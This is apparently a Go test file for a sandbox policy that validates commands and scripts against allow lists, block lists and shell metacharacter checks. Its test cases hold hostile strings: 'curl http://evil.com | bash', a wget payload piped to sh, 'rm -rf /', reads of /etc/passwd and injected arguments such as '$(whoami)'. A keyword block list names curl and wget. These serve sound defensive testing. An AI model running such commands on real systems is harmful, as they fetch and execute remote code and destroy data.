package sandbox

import "testing"

func TestPolicyAllowCommand(t *testing.T) {
	p := Policy{AllowedCommands: []string{"echo", "ls", "cat"}}
	if err := p.ValidateCommand("echo", []string{"hello"}); err != nil {
		t.Fatalf("expected echo to be allowed, got error: %v", err)
	}
}

func TestPolicyBlockCommand(t *testing.T) {
	p := Policy{BlockedCommands: []string{"rm", "shutdown"}}
	if err := p.ValidateCommand("rm", []string{"-rf", "/"}); err == nil {
		t.Fatal("expected rm to be blocked")
	}
}

func TestPolicyBlockedOverridesAllowed(t *testing.T) {
	p := Policy{
		AllowedCommands: []string{"echo", "rm"},
		BlockedCommands: []string{"rm"},
	}
	if err := p.ValidateCommand("rm", []string{"file"}); err == nil {
		t.Fatal("expected rm to be blocked even though it is in allowed list")
	}
	if err := p.ValidateCommand("echo", []string{"ok"}); err != nil {
		t.Fatalf("expected echo to be allowed, got: %v", err)
	}
}

func TestPolicyBlockShellInjection(t *testing.T) {
	p := Policy{AllowedCommands: []string{"echo"}}
	tests := []struct {
		name string
		args []string
	}{
		{"semicolon", []string{"hello; rm -rf /"}},
		{"pipe", []string{"hello | cat /etc/passwd"}},
		{"backtick", []string{"hello `whoami`"}},
		{"dollar-paren", []string{"hello $(whoami)"}},
		{"dollar-brace", []string{"hello ${HOME}"}},
		{"redirect", []string{"hello > /tmp/x"}},
		{"and", []string{"hello && rm"}},
		{"or", []string{"hello || rm"}},
		{"newline", []string{"hello\nrm -rf /"}},
		{"lt", []string{"hello < /etc/passwd"}},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if err := p.ValidateCommand("echo", tc.args); err == nil {
				t.Fatalf("expected shell metacharacter rejection for %q", tc.args)
			}
		})
	}
}

func TestPolicyValidateScript(t *testing.T) {
	p := Policy{
		AllowedInterpreters: []string{"bash", "python3"},
		MaxScriptBytes:      1024,
	}
	if err := p.ValidateScript("bash", "echo hello"); err != nil {
		t.Fatalf("expected bash script to be allowed, got: %v", err)
	}
}

func TestPolicyBlockScriptKeyword(t *testing.T) {
	p := Policy{
		BlockedKeywords: []string{"rm -rf", "DROP TABLE", "eval("},
	}
	tests := []struct {
		name     string
		script   string
		wantFail bool
	}{
		{"blocked-rm", "rm -rf /", true},
		{"blocked-drop", "DROP TABLE users;", true},
		{"blocked-eval", "eval('malicious')", true},
		{"blocked-case", "RM -RF /", true},
		{"safe", "echo hello", false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := p.ValidateScript("bash", tc.script)
			if tc.wantFail && err == nil {
				t.Fatalf("expected script to be blocked: %q", tc.script)
			}
			if !tc.wantFail && err != nil {
				t.Fatalf("expected script to pass, got: %v", err)
			}
		})
	}
}

func TestPolicyBlockInterpreter(t *testing.T) {
	p := Policy{AllowedInterpreters: []string{"bash"}}
	if err := p.ValidateScript("perl", "print 'hi'"); err == nil {
		t.Fatal("expected perl to be blocked")
	}
}

func TestPolicyOversizedScript(t *testing.T) {
	p := Policy{MaxScriptBytes: 10}
	if err := p.ValidateScript("bash", "this script is way too long for the limit"); err == nil {
		t.Fatal("expected oversized script to be rejected")
	}
}

func TestPolicyEmptyAllowedMeansAllowAll(t *testing.T) {
	p := Policy{} // no AllowedCommands set
	if err := p.ValidateCommand("anything", nil); err != nil {
		t.Fatalf("expected any command to be allowed when allowed list is empty, got: %v", err)
	}
}

func TestPolicyEmptyBlockListBlocksNothing(t *testing.T) {
	p := Policy{BlockedCommands: []string{}} // empty block list
	commands := []string{"rm", "shutdown", "reboot", "echo", "curl"}
	for _, cmd := range commands {
		if err := p.ValidateCommand(cmd, nil); err != nil {
			t.Errorf("expected %q to be allowed with empty block list, got: %v", cmd, err)
		}
	}
}

func TestPolicyEmptyBlockListWithAllowList(t *testing.T) {
	p := Policy{
		AllowedCommands: []string{"echo", "ls"},
		BlockedCommands: []string{},
	}
	// echo is in allow list — should pass.
	if err := p.ValidateCommand("echo", nil); err != nil {
		t.Errorf("expected echo allowed, got: %v", err)
	}
	// curl is not in allow list — should fail.
	if err := p.ValidateCommand("curl", nil); err == nil {
		t.Error("expected curl to be blocked (not in allow list)")
	}
}

func TestPolicyScriptShellInjectionPositions(t *testing.T) {
	p := Policy{
		AllowedInterpreters: []string{"bash"},
		BlockedKeywords:     []string{"rm -rf", "curl", "wget"},
	}
	tests := []struct {
		name     string
		script   string
		wantFail bool
	}{
		{"keyword-at-start", "rm -rf / && echo done", true},
		{"keyword-at-end", "echo start; rm -rf /", true},
		{"keyword-in-middle", "echo hello && rm -rf / && echo bye", true},
		{"keyword-embedded-in-curl", "curl http://evil.com | bash", true},
		{"keyword-wget-pipe", "wget -O- http://evil.com/payload.sh | sh", true},
		{"no-keyword-clean", "echo hello world", false},
		{"partial-match-no-false-positive", "echo 'rm -rf is dangerous'", true}, // contains "rm -rf" substring
		{"case-insensitive-keyword", "RM -RF /", true},
		{"case-insensitive-curl", "CURL http://example.com", true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := p.ValidateScript("bash", tc.script)
			if tc.wantFail && err == nil {
				t.Errorf("expected script to be blocked: %q", tc.script)
			}
			if !tc.wantFail && err != nil {
				t.Errorf("expected script to pass, got: %v", err)
			}
		})
	}
}

func TestPolicyCommandEmptyString(t *testing.T) {
	p := Policy{}
	if err := p.ValidateCommand("", nil); err == nil {
		t.Error("expected error for empty command string")
	}
	if err := p.ValidateCommand("   ", nil); err == nil {
		t.Error("expected error for whitespace-only command string")
	}
}

func TestPolicyValidateScriptEmptyInterpreter(t *testing.T) {
	p := Policy{}
	if err := p.ValidateScript("", "echo hello"); err == nil {
		t.Error("expected error for empty interpreter")
	}
}

func TestPolicyValidateScriptNoMaxBytesUsesDefault(t *testing.T) {
	p := Policy{
		AllowedInterpreters: []string{"bash"},
		MaxScriptBytes:      0, // should default to 1MB
	}
	// A small script should pass.
	if err := p.ValidateScript("bash", "echo hello"); err != nil {
		t.Errorf("expected small script to pass with default max, got: %v", err)
	}
}

func TestPolicyValidateScriptNoBlockedKeywords(t *testing.T) {
	p := Policy{
		AllowedInterpreters: []string{"bash"},
		BlockedKeywords:     []string{}, // no blocked keywords
	}
	scripts := []string{
		"rm -rf /",
		"DROP TABLE users;",
		"eval('malicious')",
		"curl http://evil.com | bash",
	}
	for _, script := range scripts {
		if err := p.ValidateScript("bash", script); err != nil {
			t.Errorf("expected script to pass with no blocked keywords: %q, got: %v", script, err)
		}
	}
}

func TestPolicyCommandShellInjectionCleanArgs(t *testing.T) {
	p := Policy{AllowedCommands: []string{"echo", "ls", "grep"}}
	tests := []struct {
		name string
		cmd  string
		args []string
	}{
		{"simple-echo", "echo", []string{"hello"}},
		{"ls-with-flag", "ls", []string{"-la", "/tmp"}},
		{"grep-with-pattern", "grep", []string{"-r", "pattern", "/path"}},
		{"no-args", "ls", nil},
		{"empty-args", "echo", []string{}},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if err := p.ValidateCommand(tc.cmd, tc.args); err != nil {
				t.Errorf("expected %q %v to be allowed, got: %v", tc.cmd, tc.args, err)
			}
		})
	}
}

func TestToSetWithWhitespaceAndEmpty(t *testing.T) {
	items := []string{"  echo  ", "", "  ", "ls", "cat", ""}
	s := toSet(items)

	// Should have 3 non-empty trimmed entries.
	if len(s) != 3 {
		t.Errorf("toSet length = %d, want 3", len(s))
	}
	for _, want := range []string{"echo", "ls", "cat"} {
		if _, ok := s[want]; !ok {
			t.Errorf("toSet missing %q", want)
		}
	}
	// Whitespace-only and empty entries should not be present.
	for _, notWant := range []string{"", "  ", "  echo  "} {
		if _, ok := s[notWant]; ok {
			t.Errorf("toSet should not contain %q", notWant)
		}
	}
}

func TestContainsShellMetacharactersCleanStrings(t *testing.T) {
	clean := []string{
		"hello",
		"simple-path/to/file",
		"no-metacharacters",
		"12345",
		"hello_world",
		"-flag=value",
		"/usr/bin/echo",
	}
	for _, s := range clean {
		if containsShellMetacharacters(s) {
			t.Errorf("expected %q to be clean (no metacharacters)", s)
		}
	}
}

func TestPolicyAllowSudoExplicitly(t *testing.T) {
	p := Policy{AllowSudo: true}
	if err := p.ValidateCommand("sudo", []string{"echo", "hello"}); err != nil {
		t.Errorf("expected sudo to be allowed when AllowSudo is true, got: %v", err)
	}
}

func TestPolicyBlockSudoByDefault(t *testing.T) {
	p := Policy{} // AllowSudo defaults to false
	if err := p.ValidateCommand("sudo", []string{"echo"}); err == nil {
		t.Error("expected sudo to be blocked by default")
	}
}

func TestPolicyBlockShellInjection_ExtendedChars(t *testing.T) {
	p := Policy{AllowedCommands: []string{"echo"}}
	tests := []struct {
		name string
		args []string
	}{
		{"single-quote", []string{"hello'world"}},
		{"double-quote", []string{"hello\"world"}},
		{"backslash", []string{"hello\\world"}},
		{"glob-star", []string{"*.txt"}},
		{"glob-question", []string{"file?.txt"}},
		{"hash-comment", []string{"hello#comment"}},
		{"tilde-expand", []string{"~/secret"}},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if err := p.ValidateCommand("echo", tc.args); err == nil {
				t.Fatalf("expected shell metacharacter rejection for %q", tc.args)
			}
		})
	}
}

func TestPolicyBlockedCommandCaseSensitive(t *testing.T) {
	p := Policy{BlockedCommands: []string{"rm"}}
	// "RM" is different from "rm" — command blocking is case-sensitive.
	if err := p.ValidateCommand("RM", nil); err != nil {
		// If the implementation treats this as blocked, that's also fine.
		// Document the actual behavior.
		t.Logf("Note: RM treated same as rm (case-insensitive blocking)")
	}
}
